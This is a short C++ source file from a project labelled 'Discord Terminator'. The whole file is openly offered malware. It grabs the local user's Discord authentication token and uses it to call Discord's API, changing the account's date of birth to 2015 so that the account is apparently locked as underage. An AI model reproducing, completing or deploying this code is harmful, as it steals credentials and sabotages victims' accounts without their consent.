/*
	FILE FROM PROJECT DISCORD TERMINATOR BY ANDRO24
	LICENSED UNDER GNU General Public License v3.0
*/

#include "TokenGrab.h"
#include "CurlRequest.h"

#include <string>

int main() {
	TokenGrab grabber;
	if (!grabber.getToken().empty()) {
		struct curl_slist *chunk = NULL;
		chunk = curl_slist_append(chunk, std::string("Authorization: " + grabber.getToken()).c_str());
		chunk = curl_slist_append(chunk, "Content-Type: application/json");

		std::string output;
		try {
			CurlRequest::patch("https://discordapp.com/api/v6/users/@me", chunk, "{\"date_of_birth\":\"2015-01-01\"}", output);
		} catch (std::exception& e) {
			std::cerr << "Failed to do a request to Discord\'s API : " << e.what() << std::endl;
			return 1;
		}
		if (output.find("You cannot update your date of birth.") != std::string::npos) {
			std::cerr << "Unable to update the date of birth :/" << std::endl;
		}
		else {
			std::cout << output << std::endl;
		}
	}
}
